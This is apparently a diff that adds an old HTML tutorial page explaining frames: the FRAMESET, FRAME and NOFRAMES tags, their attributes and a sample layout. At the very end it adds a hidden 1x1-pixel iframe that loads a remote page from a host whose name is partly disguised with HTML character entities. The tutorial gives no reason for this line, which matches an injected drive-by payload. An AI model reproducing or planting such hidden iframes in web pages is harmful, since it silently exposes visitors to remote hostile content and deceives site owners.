@@ -1,0 +1,70 @@
+<HTML>
+<HEAD>
+<TITLE>Lesson 11: Oh my god, I've been framed!</TITLE>
+</HEAD>
+
+<BODY>
+<H2>Lesson 11: Oh my god, I've been framed!</H2>
+
+Silly titles aside, frames are one of the most interesting and beautiful things any page can have. Be warned though - they can also be a design disaster, namely when a browser does not support frames (pre-Netscape 2.0 browsers do'nt).<p>
+
+A <i>frame</i> is a distinct section in a browser window. This section can be independent of the other sections in the window, and if we allow it, it can be resized. Like just about everything we've covered so far, making a web site with frames is easy. In fact, many people think creating tables are harder!<p>
+
+Creating frames is just a little different from making normal web pages. To make a frame, we need to create a <i>frame layout page</i> that links to the divisions of the page. On the layout page we put the &#60;FRAMESET&#62; and &#60;FRAME&#62; tags that tell the browser how to display the frames.<p>
+
+The &#60;FRAMESET&#62; tag has 3 attributes, ROWS, COLS and FRAMEBORDER. The ROWS attribute tells the browser "I (number) rows of frames, this size" by putting it into the &#60;FRAMESET&#62; tag like this: &#60;FRAMESET ROWS="33%, 33%, 34%"&#62;. This would put 3 different frames on the page, separated like rows in a table. The COLS attribute works similarly, except it divides the page into columns instead of rows.<p>
+
+The FRAMEBORDER attribute specifies whether you want your frame to have borders or not.  This attribute's use is a bit restricted though: you can only pass it either 0 or 1 as an argument. FRAMEBORDER="0" eliminates borders, and FRAMEBORDER="1" turns borders on.<p>
+
+So far, our bare-bones frame layout page looks like this:<p>
+
+&#60;HTML&#62;<BR>
+&#60;HEAD&#62;<BR>
+&#60;TITLE&#62;Welcome to Little v's frame demo!&#60;/TITLE&#62;<BR>
+&#60;/HEAD&#62;<p>
+
+&#60;FRAMESET COLS="40%, 60%"&#62;<BR>
+&#60;/FRAMESET&#62;<p>
+
+&#60;/HTML&#62;<p>
+
+Notice anything missing? Yep, the BODY! However, this is justified: since this is just a frame <i>layout</i> and not an actual page with information, it really does'nt have a body. Hmm, that did'nt sound too healthy. Oh well, now for the business of displaying our actual frames.<p>
+
+To define the content of the two frames that we just created, we need to use the &#60;FRAME&#62; tag. The FRAME tag has a few attributes that give us extensive control of our frames. The most important attribute is the SRC attribute. This attribute gives the location of the HTML file to be displayed in the frame. Basically, &#60;FRAME SRC&#62; works for frames the same as &#60;IMG SRC&#62; does for images.<p>
+
+After the mandatory SRC tag, there are a few more attributes to the &#60;FRAME&#62; tag that we can use to give us control over how our frame is displayed. We can toggle the borders on or off in our individual frames by putting the FRAMEBORDER attribute in the &#60;FRAME&#62; tag. We can change the margins in our frame with the MARGINHEIGHT and MARGINWIDTH attributes. The proper way to set a margin is like this:<p>
+
+&#60;FRAME MARGINWIDTH="x"&#62;<p>
+
+Where x is any number. What is we want our frame to be fixed so the browser cannot resize it? We could tape up the browser's keyboard, or we could use the NORESIZE attribute. This attribute takes no arguments, and when placed in the &#60;FRAME&#62; tag, it locks out the resize option in the browser. If we want to get really specific as to the display of our frame, we can use the SCROLLING attribute to set whether the browser shows a scrollbar. We can either pass SCROLLING  a yes, no, or an auto (sorry, no maybe's!). Auto allows the viewer's browser to determine whether or not it needs a scrollbar. The default is auto.<p>
+
+When we apply what we just learned and update our "bare-bones" frame layout, the code looks like this:<p>
+
+&#60;HTML&#62;<BR>
+&#60;HEAD&#62;<BR>
+&#60;TITLE&#62;Welcome to Little v's frame demo!&#60;/TITLE&#62;<BR>
+&#60;/HEAD&#62;<p>
+
+&#60;FRAMESET COLS="40%, 60%" FRAMEBORDER="0"&#62;<BR>
+&#60;FRAME SRC="leftframe.html"&#62;
+&#60;FRAME SRC="rightframe.html"&#62;
+&#60;/FRAMESET&#62;<p>
+
+&#60;/HEAD&#62;<BR>
+&#60;/HTML&#62;<p>
+
+Now if we crank out one page for the left frame and one for the right frame, we'll have something like <A HREF="framesdemo.html">this (click here for the example)</A>. <p>
+
+But what about if our casual browser is surfing with frames off, or even worse, what happens if his browser does'nt even support frames? Always ready with a work-around, HTML offers us the &#60;NOFRAMES&#62; tag. It works like this: anything between the &#60;NOFRAMES&#62; and &#60;/NOFRAMES&#62; tags on the frame format page will be shown to browsers that cannot display frames, or have frames turned off. A clever use for this tag would be to add a message with a link to the main page of your site, so these visitors can navigate your site without use of the frames. Something along these lines would work:<p>
+
+&#60;NOFRAMES&#62;<BR>
+I see you ca'nt see my frames, but you can still navigate my site the old fashioned way! &#60;A HREF="mainpage.html"&#62;Click Here!&#60;/A&#62;<BR>
+&#60;/NOFRAMES&#62;<p>
+
+That just about sums it up for frames. Go and read the <A HREF="summary.html">summary</A> for advice on applying what you've learned, and how to advance your knowledge of html.<p>
+
+<A HREF="../main3.html">Back to Blacksun's Mainpage</A>
+
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY>
+</HTML>
